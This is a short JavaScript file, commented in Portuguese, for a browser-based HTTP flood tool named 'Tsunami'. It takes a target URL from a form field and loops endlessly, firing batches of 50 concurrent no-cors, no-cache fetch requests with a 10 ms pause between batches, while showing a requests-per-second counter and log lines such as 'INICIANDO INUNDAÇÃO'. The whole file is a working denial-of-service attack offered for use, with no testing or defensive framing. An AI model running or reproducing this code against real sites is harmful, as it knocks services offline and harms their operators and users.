let ativo = false;
let requisicoesEnviadas = 0;
let rps = 0;

function log(msg) {
    const logBox = document.getElementById('log');
    logBox.innerHTML += `<br>> ${msg}`;
    logBox.scrollTop = logBox.scrollHeight;
}

async function toggleTsunami() {
    const alvo = document.getElementById('target').value;
    const btn = document.getElementById('btn-main');

    if (!alvo) {
        log("<span class='warning'>ERRO: Alvo não definido!</span>");
        return;
    }

    ativo = !ativo;

    if (ativo) {
        btn.innerHTML = "Parar Onda";
        btn.style.background = "#ff0000";
        document.getElementById('engine-status').innerHTML = "RUNNING";
        document.getElementById('engine-status').style.color = "#ff0000";
        log(`ALVO TRAVADO: ${alvo}`);
        log("INICIANDO INUNDAÇÃO...");
        inundar(alvo);
    } else {
        btn.innerHTML = "Iniciar Onda";
        btn.style.background = "#00ffff";
        document.getElementById('engine-status').innerHTML = "IDLE";
        document.getElementById('engine-status').style.color = "#00ffff";
        log("ONDA ENCERRADA PELO USUÁRIO.");
    }
}

async function inundar(url) {
    while (ativo) {
        // Dispara lotes de 50 requisições simultâneas para não travar o celular de vez
        const disparos = Array.from({ length: 50 }, () => 
            fetch(url, { mode: 'no-cors', cache: 'no-store' })
                .then(() => { requisicoesEnviadas++; })
                .catch(() => { requisicoesEnviadas++; })
        );

        await Promise.allSettled(disparos);
        
        // Pequena pausa para o navegador processar a interface
        await new Promise(r => setTimeout(r, 10)); 
    }
}

// Contador de RPS (Requisições por Segundo)
setInterval(() => {
    if (ativo) {
        document.getElementById('rps').innerHTML = requisicoesEnviadas;
        requisicoesEnviadas = 0;
    } else {
        document.getElementById('rps').innerHTML = "0";
    }
}, 1000);
